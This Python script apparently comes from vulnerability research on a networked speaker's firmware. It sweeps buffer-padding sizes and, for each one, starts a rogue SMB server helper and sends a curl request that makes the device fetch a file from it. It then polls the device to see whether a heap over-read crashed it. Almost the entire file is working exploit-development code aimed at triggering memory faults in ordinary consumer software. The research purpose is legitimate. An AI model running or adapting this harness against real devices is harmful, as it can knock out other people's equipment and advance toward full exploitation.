#!/usr/bin/env python3
"""Pad sweep across the glibc mmap threshold (bead frankensonos-f4k).

Prediction being tested (allocation-lifetime analysis, 2026-11-03): with
--pad > 131072 the QUERY_INFO variable receive buffer crosses the glibc 2.23
mmap threshold, so free() munmaps a hole instead of systrimming the break;
the reply buffer's end is then always page-guard-adjacent and the 2-byte
FileNameLength over-read should fault WITHOUT heap aging.

Per size: fresh server, one getaa walk (declared = pad-98), recovery poll,
SWGen check. Fresh file name per shot to dodge art-cache negative marking.
"""
import json, os, subprocess, sys, time

TGT = '192.168.4.86'
HOST = os.environ.get('F4K_HOST', '192.168.4.200')
PY = '/private/tmp/fsonos-venv/bin/python'
ENV = dict(os.environ, PYTHONPATH='/tmp/impacket-fresh')
NC0 = '/Users/jemanuel/projects/frankensonos/recon/smb4149/nc0drop.py'
LOGDIR = '/tmp/f4k_padsweep'
os.makedirs(LOGDIR, exist_ok=True)
BASE_PORT = 4420

PADS = [int(x) for x in (sys.argv[1].split(',') if len(sys.argv) > 1
                         else ['131072', '147456', '163840', '196608'])]

def zp():
    p = subprocess.run(['curl', '-s', '-m', '4', f'http://{TGT}:1400/status/zp'],
                       capture_output=True, text=True)
    return (200, p.stdout) if p.returncode == 0 and p.stdout else (0, '')

def swgen():
    c, t = zp()
    if c != 200: return None
    i = t.find('<SWGen>')
    return t[i+7:t.find('<', i+7)] if i >= 0 else None

def curl_getaa(port, timeout=60, name='folder.jpg'):
    url = f'http://{TGT}:1400/getaa?u=x-file-cifs%3A%2F%2F{HOST}%3A{port}%2FS%2F{name}&w=200&h=200'
    p = subprocess.run(['curl', '-s', '-m', str(timeout), '-o', '/dev/null',
                        '-w', '%{http_code}:%{time_total}', url],
                       capture_output=True, text=True)
    return p.stdout.strip() if p.returncode == 0 else 'curlrc%d' % p.returncode

def serve(args, port, logname):
    log = open(os.path.join(LOGDIR, logname), 'w')
    p = subprocess.Popen([PY, NC0, str(port)] + args, stdout=log, stderr=subprocess.STDOUT, env=ENV)
    time.sleep(2.0)
    return p, log

def stop(p, log):
    p.terminate()
    try: p.wait(timeout=5)
    except Exception: p.kill()
    log.close()

def wait_alive(max_s=90):
    t0 = time.time()
    while time.time() - t0 < max_s:
        c, _ = zp()
        if c == 200: return round(time.time() - t0, 1)
        time.sleep(1.0)
    return None

def qinfo_declared(logpath):
    """Extract the wire-confirmed declared FileNameLength from the server log."""
    try:
        for line in open(logpath):
            if 'QINFO patch' in line and 'declared->' in line:
                seg = line.split('declared->')[1]
                return int(seg.split()[0])
    except Exception:
        pass
    return None

NAMES = {131072: 'pw131.jpg', 147456: 'pw147.jpg', 163840: 'pw163.jpg', 196608: 'pw196.jpg'}

results = []
print(f'baseline SWGen={swgen()}', flush=True)
for idx, pad in enumerate(PADS):
    port = BASE_PORT + (idx % 5)
    name = NAMES.get(pad, 'folder.jpg')
    logname = f'pad_{pad}_{idx}.log'
    p, log = serve(['--pad', str(pad)], port, logname)
    g = curl_getaa(port, timeout=60, name=name)
    stop(p, log)
    rec_s = wait_alive()
    sw_after = swgen()
    rec = {'pad': pad, 'declared': qinfo_declared(os.path.join(LOGDIR, logname)),
           'getaa': g, 'recover_s': rec_s, 'sw': sw_after,
           'verdict': ('WEDGE' if (rec_s is None or (rec_s or 99) > 5 or
                                    (sw_after not in (None, results[0]['sw'] if results else None)))
                       else 'ok')}
    results.append(rec)
    print(json.dumps(rec), flush=True)
    with open(os.path.join(LOGDIR, 'padsweep.json'), 'w') as f:
        json.dump(results, f, indent=1)
    time.sleep(3)
print('final SWGen=', swgen(), flush=True)
